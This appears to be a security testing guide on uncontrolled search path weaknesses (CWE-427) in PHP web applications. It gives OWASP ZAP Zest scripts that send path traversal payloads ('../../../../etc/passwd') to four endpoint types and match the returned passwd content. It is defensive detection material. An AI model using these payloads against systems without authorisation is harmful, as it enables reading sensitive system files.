# Uncontrolled Search Path Element (CWE-427) in PHP

###### Uncontrolled Search Path Element (CWE-427)

**Definition:**
Uncontrolled Search Path Element occurs when a program uses a fixed and potentially predictable search path to locate resources (e.g., libraries, configuration files). This could lead attackers to place malicious resources in the path, causing the program to execute or load them unintentionally.

**Variations and Impacts in PHP Web Applications:**
For PHP web applications, especially using popular frameworks like Laravel, Symfony, Zend, etc., Uncontrolled Search Path Element vulnerabilities can manifest in several ways:

1. **Including Files Based on User Input:**
   - Usage of `include`, `require`, `include_once`, and `require_once` with user-supplied input without proper validation.
  
2. **Loading Configuration or Resources Based on User Input:**
   - Usage of functions like `file_get_contents` or `fopen` with paths derived from user input.

3. **Dynamic Class Loading:**
   - Usage of `spl_autoload_register` with user-supplied class names which might include paths.

4. **Template Engines:**
   - Allowing users to specify template paths without validation when using engines like Twig in Symfony.

**Detection Using OWASP ZAP Zest Scripts:**
To detect these variations, Zest scripts can be utilized. Zest is a domain-specific scripting language designed for automating security tests within the OWASP ZAP tool.

Here are Zest scripts for the different variations:

#### Variation 1: File Inclusion Based on User Input
```json
{
  "title": "Detect Uncontrolled Search Path Element in File Include",
  "description": "Detects if user input is directly used in include function leading to code execution.",
  "prefix": "http://{your-target-site}",
  "statements": [
    {
      "type": "ZestRequest",
      "method": "GET",
      "url": "http://{your-target-site}/vulnerable.php?file=../../../../etc/passwd",
      "response": {
        "statusCode": 200
      },
      "assertions": [
        {
          "type": "BodyRegex",
          "regex": "root:.*:0:0:"
        }
      ]
    },
    {
      "type": "Fail",
      "message": "Potential Local File Inclusion Vulnerability Detected."
    }
  ]
}
```

#### Variation 2: Loading Configuration or Resources
```json
{
  "title": "Detect Uncontrolled Search Path Element in File Load",
  "description": "Detects if user input is used in file_get_contents leading to arbitrary file reading.",
  "prefix": "http://{your-target-site}",
  "statements": [
    {
      "type": "ZestRequest",
      "method": "GET",
      "url": "http://{your-target-site}/config-loader.php?config=../../../../etc/passwd",
      "response": {
        "statusCode": 200
      },
      "assertions": [
        {
          "type": "BodyRegex",
          "regex": "root:.*:0:0:"
        }
      ]
    },
    {
      "type": "Fail",
      "message": "Potential Arbitrary File Read Vulnerability Detected."
    }
  ]
}
```

#### Variation 3: Dynamic Class Loading
```json
{
  "title": "Detect Dynamic Class Loading Vulnerability",
  "description": "Detects if user input is used in dynamic class loading.",
  "prefix": "http://{your-target-site}",
  "statements": [
    {
      "type": "ZestRequest",
      "method": "GET",
      "url": "http://{your-target-site}/class-loader.php?class=../../../../etc/passwd",
      "response": {
        "statusCode": 200
      },
      "assertions": [
        {
          "type": "BodyRegex",
          "regex": "root:.*:0:0:"
        }
      ]
    },
    {
      "type": "Fail",
      "message": "Potential Dynamic Class Loading Vulnerability Detected."
    }
  ]
}
```

#### Variation 4: Template Engines
```json
{
  "title": "Detect Template Path Manipulation Vulnerability",
  "description": "Detects if user input is used in template path loading.",
  "prefix": "http://{your-target-site}",
  "statements": [
    {
      "type": "ZestRequest",
      "method": "GET",
      "url": "http://{your-target-site}/template-loader.php?template=../../../../etc/passwd",
      "response": {
        "statusCode": 200
      },
      "assertions": [
        {
          "type": "BodyRegex",
          "regex": "root:.*:0:0:"
        }
      ]
    },
    {
      "type": "Fail",
      "message": "Potential Template Path Manipulation Vulnerability Detected."
    }
  ]
}
```

### Implementation Details:
- **Endpoints**: Replace `{your-target-site}` and endpoints (e.g., `vulnerable.php`, `config-loader.php`, `class-loader.php`, `template-loader.php`) with the actual URL and vulnerable endpoints of the application under test.
- **Patterns**: The regex pattern `root:.*:0:0:` is used to detect `/etc/passwd` file content in Unix-like systems. Modify this regex based on the target environment.

The provided Zest scripts are designed to exploit typical uncontrolled search path scenarios. They help in identifying vulnerabilities by simulating actual attack patterns. The assertions and failure messages ensure clarity in identifying the potential vulnerabilities while keeping false positives and negatives low. Make sure the scripts align with the specific context of your application during the testing phase.